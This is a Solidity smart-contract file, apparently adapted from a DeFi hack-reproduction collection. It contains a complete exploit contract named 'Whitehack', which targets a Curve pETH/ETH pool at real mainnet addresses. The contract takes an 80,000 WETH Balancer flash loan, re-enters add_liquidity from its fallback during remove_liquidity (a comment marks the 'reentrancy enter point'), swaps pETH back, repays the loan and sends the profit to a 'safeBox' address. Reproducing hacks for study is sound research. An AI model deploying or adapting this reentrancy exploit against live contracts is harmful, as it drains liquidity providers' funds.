// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Adapted by SunWeb3Sec
// https://github.com/SunWeb3Sec/DeFiHackLabs/commit/5fc2bbee4d2bee4442ecb2fc39942c38444f5450#diff-130d2452b6f07fd382ae3bf4f0a16269fa9446a29f6e7c49212ec0d47c8cccae

import "./interface.sol";

contract Whitehack {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    IERC20 LP = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    ICurvePool CurvePool = ICurvePool(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    uint256 nonce;

    address public safeBox = 0xBEEfbEEf00000000000000000000000000000000;

    constructor() payable {}

    function go(bytes calldata params) external returns (bytes memory) {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        return params;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.withdraw(WETH.balanceOf(address(this)));
        uint256[2] memory amount;
        amount[0] = 40_000 ether;
        amount[1] = 0;
        CurvePool.add_liquidity{value: 40_000 ether}(amount, 0);

        amount[0] = 0;
        CurvePool.remove_liquidity(LP.balanceOf(address(this)), amount); // reentrancy enter point
        nonce++;

        CurvePool.remove_liquidity(10_272 ether, amount);

        WETH.deposit{value: address(this).balance}();

        pETH.approve(address(CurvePool), pETH.balanceOf(address(this)));
        CurvePool.exchange(1, 0, pETH.balanceOf(address(this)), 0);

        WETH.deposit{value: address(this).balance}();

        WETH.transfer(address(Balancer), 80_000 ether);

        WETH.transfer(safeBox, WETH.balanceOf(address(this)));
    }

    fallback() external payable {
        if (msg.sender == address(CurvePool) && nonce == 0) {
            uint256[2] memory amount;
            amount[0] = 40_000 ether;
            amount[1] = 0;
            CurvePool.add_liquidity{value: 40_000 ether}(amount, 0);
        }
    }
}